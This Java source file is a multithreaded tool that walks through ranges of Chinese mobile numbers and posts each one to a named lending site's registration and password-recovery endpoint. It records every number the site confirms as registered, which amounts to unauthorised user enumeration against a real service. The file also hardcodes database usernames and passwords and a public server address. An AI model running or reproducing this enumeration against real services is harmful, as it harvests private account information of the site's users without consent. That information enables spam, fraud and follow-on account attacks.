package com.pinting.site;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.URI;
import java.net.URISyntaxException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

import org.apache.commons.httpclient.HttpClient;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class UrlUtil {

	public static Logger log = LoggerFactory.getLogger(UrlUtil.class);
	
	public static void main(String[] args) throws Exception {
		
		//过滤归属地 默认为 true， 不过滤设为false（不启用数据库）
		SendRunable.isExcludeGSDFlag = false;
		
		//号码段，号码段长度，文件路径
		SendRunable runable0 = new SendRunable(13500000000L,4,"F://phone0.txt");
		new Thread(runable0).start();
		//new Thread(runable0).start();
		
		SendRunable runable1 = new SendRunable(13510000000L,4,"F://phone1.txt");
		new Thread(runable1).start();
		//new Thread(runable1).start();

		SendRunable runable2 = new SendRunable(13520000000L,4,"F://phone2.txt");
		new Thread(runable2).start();
		//new Thread(runable2).start();

		SendRunable runable3 = new SendRunable(13530000000L,4,"F://phone3.txt");
		new Thread(runable3).start();
		//new Thread(runable3).start();
			
		
		
		
		/*SendRunable.gsdUrlFlag = true;
		SendRunable gsdRunable1 = new SendRunable(1785597L,3,"F://178.txt");
		new Thread(gsdRunable1).start();
		
		SendRunable gsdRunable2 = new SendRunable(1895586L,3,"F://189.txt");
		new Thread(gsdRunable2).start();
		
		SendRunable gsdRunable3 = new SendRunable(1529684L,3,"F://152.txt");
		new Thread(gsdRunable3).start();
		
		SendRunable gsdRunable4 = new SendRunable(1559744L,3,"F://155.txt");
		new Thread(gsdRunable4).start();
		
		SendRunable gsdRunable5 = new SendRunable(1569397L,3,"F://156.txt");
		new Thread(gsdRunable5).start();*/
	
		
		
	}
	
	
	public static String post(String url, Map<String, String> params) {
		DefaultHttpClient httpclient = new DefaultHttpClient();
		String body = null;
		HttpPost post = postForm(url, params);
		body = invoke(httpclient, post);
		httpclient.getConnectionManager().shutdown();
		return body;
	}
	public static String get(String url) {
		DefaultHttpClient httpclient = new DefaultHttpClient();
		String body = null;
		HttpGet request = new HttpGet();  
        try {
			request.setURI(new URI(url));
			body = paseResponse(httpclient.execute(request),"gb2312");  
		} catch (URISyntaxException | IOException e) {
			log.error("get.UnsupportedEncodingException");
		}  
		httpclient.getConnectionManager().shutdown();
		return body;
	}
	

	private static HttpPost postForm(String url, Map<String, String> params) {
		HttpPost httpost = new HttpPost(url);
		List<BasicNameValuePair> nvps = new ArrayList<BasicNameValuePair>();
		Set<String> keySet = params.keySet();
		for (String key : keySet) {
			BasicNameValuePair basicNameValuePair = new BasicNameValuePair(key,
					params.get(key));
			nvps.add(basicNameValuePair);
		}
		try {
			httpost.setEntity(new UrlEncodedFormEntity(nvps, HTTP.UTF_8));
		} catch (UnsupportedEncodingException e) {
			log.error("httpost.setEntity.UnsupportedEncodingException");
		}
		return httpost;
	}

	private static String invoke(DefaultHttpClient httpclient,
			HttpUriRequest httpost) {
		HttpResponse response = sendRequest(httpclient, httpost);
		String body = paseResponse(response, "UTF-8");
		return body;
	}

	private static HttpResponse sendRequest(DefaultHttpClient httpclient,
			HttpUriRequest httpost) {
		HttpResponse response = null;
		try {
			response = httpclient.execute(httpost);
		} catch (Exception e) {
			log.error("sendRequest.Exception");
		}
		return response;
	}

	private static String paseResponse(HttpResponse response, String charset) {
		HttpEntity entity = response.getEntity();
		String body = null;
		try {
			if(charset != null ){
				body = EntityUtils.toString(entity, charset);
			}else{
				body = EntityUtils.toString(entity);
			}
			
		} catch (Exception e) {
			log.error("paseResponse.Exception");
		}
		return body;
	}

}

class SendRunable implements Runnable {
	public static String url = "https://m.wukonglicai.com/weixin/registerLogin/registerPost.do";
	public static Boolean gsdUrlFlag = false;//查归属地 设为 true，查11位手机号设为false
	public static Boolean isExcludeGSDFlag = true;//过滤归属地 默认为 true， 不过滤设为false
	public static Logger log = LoggerFactory.getLogger(SendRunable.class);
	public Long phoneInit;
	public Double maxPhoneNo;
	public String recordFile;
	PrintWriter printWriter = null;
	
	List<String> excludeGSDList = new ArrayList<String>();
	
	/**
	 * 传入 号码段，号码段长度，文件路径
	 * @param phoneInit
	 * @param phonePreLength
	 * @param recordFile
	 */
	SendRunable(Long phoneInit, Integer phonePreLength, String recordFile) {
		this.phoneInit = phoneInit;
		this.recordFile = recordFile;
		if(gsdUrlFlag){
			this.maxPhoneNo = (Math.floor(phoneInit / Math.pow(10, 7 - phonePreLength)) + 1)
					* Math.pow(10, 7 - phonePreLength);
		}else{
			this.maxPhoneNo = (Math.floor(phoneInit / Math.pow(10, 11 - phonePreLength)) + 1)
					* Math.pow(10, 11 - phonePreLength);
			this.excludeGSDList = queryExcludeGSDByPreNo(String.valueOf(phoneInit).substring(0, phonePreLength));
		}
		try {
			this.printWriter = new PrintWriter(recordFile);
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void run() {
		
		while (true) {
			synchronized (this) {
				if(phoneInit < maxPhoneNo){
					
					Map<String, String> map = new HashMap<String, String>();
					String msg = "";
					if(gsdUrlFlag){
						String getUrl = "http://www.ip138.com:8080/search.asp?mobile="+String.valueOf(phoneInit)+"&action=mobile";
						try {
							msg = UrlUtil.get(getUrl);
						} catch (Exception e) {
							continue;
						}
						//System.out.println(msg);
						if (msg.contains("未知")) {
							log.error(Thread.currentThread().getName() + ":"
									+ phoneInit + ":::未知归属地!!!");
							printWriter.append((Thread.currentThread().getName() + ":"
									+ phoneInit + ":::未知归属地!!!\n"));
						} else {
							log.error(Thread.currentThread().getName() + ":"
									+ phoneInit + ":::已有归属地");
						}
					}else{
						//忽略无归属地的号码段
						if(isExcludeGSDFlag){
							if(excludeGSDCheck(String.valueOf(phoneInit))){
								phoneInit += (10000 - phoneInit%10000);
								continue;
							}
						}
						map.put("phoneNumber", String.valueOf(phoneInit));
						try {
							msg = UrlUtil.post(url, map);
						} catch (Exception e) {
							continue;
						}
						if(msg == null){
							log.error("msg is null");
							continue;
						}
						//System.out.println(msg);
						if (msg.contains("密码找回成功，请登录")) {
							log.error(Thread.currentThread().getName() + ":"
									+ phoneInit + ":::exist!!!");
							printWriter.append((Thread.currentThread().getName() + ":"
									+ phoneInit + ":::exist!!!\n"));
						} else {
							log.error(Thread.currentThread().getName() + ":"
									+ phoneInit + ":::no_exist");
							//printWriter.append((Thread.currentThread().getName() + ":"
								//	+ phoneInit + ":::no_exist\n"));
						}
					}
					printWriter.flush();
					//printWriter.close();
					phoneInit++;
					try {
						Thread.sleep(50);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}else{
					break;
				}
			}
			
		}

	}
	private boolean excludeGSDCheck(String phone) {
		boolean flag = false;
		if(excludeGSDList.size() > 0){
			for (String excludePhone : excludeGSDList) {
				String minPhone = excludePhone + "0000";
				String maxPhone = excludePhone + "9999";
				if(Long.valueOf(phone) >= Long.valueOf(minPhone) && Long.valueOf(phone) <= Long.valueOf(maxPhone)){
					log.info(phone + "-" + maxPhone + ":::已忽略");
					flag = true;
					break;
				}
			}
		}
		return flag;
	}

	private static List<String> queryExcludeGSDByPreNo(String preNo) {
		List<String> list = new ArrayList<String>();
		Connection con = null; //定义一个MYSQL链接对象
		PreparedStatement stmt = null; //创建声明
		ResultSet selectRes = null;
		try {
            Class.forName("com.mysql.jdbc.Driver").newInstance(); //MYSQL驱动
            //con = DriverManager.getConnection("jdbc:mysql://121.40.201.173:3306/p2p", "pinting", "pinting"); //链接MYSQL
            con = DriverManager.getConnection("jdbc:mysql://192.168.1.99:3306/p2p", "root", "eeee"); 

            String selectSql = "SELECT phone FROM phone_group where phone like ?";
            
            stmt = con.prepareStatement(selectSql);
            stmt.setString(1, preNo + "%");
            //查询数据并输出
            
            selectRes = stmt.executeQuery();
            while (selectRes.next()) { //循环输出结果集
            	list.add(selectRes.getString("phone"));
            	//log.info("phone:" + selectRes.getString("phone"));
            }

        } catch (Exception e) {
        	log.error("MYSQL ERROR:" + e.getMessage());
        }finally{
        	try {
        		if(selectRes != null){
            		selectRes.close();
            	}
            	if(stmt != null){
            		stmt.close();
            	}
            	if(con != null){
    				con.close();
            	}
			} catch (SQLException e) {
				e.printStackTrace();
			}
        	
        }
		
		return list;
	}
	
}